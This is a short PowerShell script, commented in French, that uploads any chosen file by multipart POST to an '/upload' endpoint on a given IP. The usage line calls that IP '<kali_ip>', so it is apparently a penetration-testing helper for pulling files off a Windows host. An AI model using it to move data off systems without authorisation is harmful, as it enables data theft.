# Upload a file to the Python Server
# USAGE : .\upload.ps1 -ip <kali_ip> [-port <port>] -file <file>
param (
   [Parameter(Mandatory=$true)][string]$ip,
   [Parameter(Mandatory=$false)][int]$port = 80,
   [Parameter(Mandatory=$true)][string]$file
)

$uri = "http://${ip}:${port}/upload"
    
# Création d'un boundary pour la requête multipart
$boundary = [System.Guid]::NewGuid().ToString()
$contentType = "multipart/form-data; boundary=$boundary"
    
# Lecture du contenu du fichier
$fileBytes = [System.IO.File]::ReadAllBytes($file)
$fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)

# Construction du corps de la requête
$bodyLines = (
     "--$boundary",
     "Content-Disposition: form-data; name=`"file`"; filename=`"$($file | Split-Path -Leaf)`"",
     "Content-Type: application/octet-stream",
     "",
     $fileEnc,
     "--$boundary--"
 ) -join "`r`n"

# Envoi de la requête
Invoke-RestMethod -Uri $uri -Method Post -ContentType $contentType -Body $bodyLines
